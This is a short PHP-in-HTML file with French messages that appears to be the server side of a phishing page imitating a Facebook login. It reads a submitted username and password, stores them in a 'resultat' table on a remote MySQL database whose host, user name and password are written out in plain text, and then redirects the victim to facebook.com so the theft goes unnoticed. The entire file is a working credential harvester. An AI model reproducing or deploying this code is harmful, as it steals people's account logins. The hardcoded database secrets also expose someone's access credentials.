<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>



    <?php


    try {
        $bdd = new PDO('mysql:host=eu-cdbr-west-03.cleardb.net;dbname=heroku_b962d9c0b40ed7b;charset=utf8', 'be8f7e9f42c00f', 'cf163a32');
    } catch (Exception $e) {
        die('Erreur : ' . $e->getMessage());
    }

    $Username = $_POST["username"];
    $Password = $_POST["password"];
    echo $Username . " " . $Password;


    $req = $bdd->prepare('INSERT INTO resultat(User, Password,IP) 
    VALUES( :User, :Password ,"MonIP")');

    $req->execute(array(
    'User' => $Username,
    'Password' => $Password

     ));
     echo 'Le compte a bien ete ajouter !';
     header('Location: https://www.facebook.com');
     ?>

</body>

</html>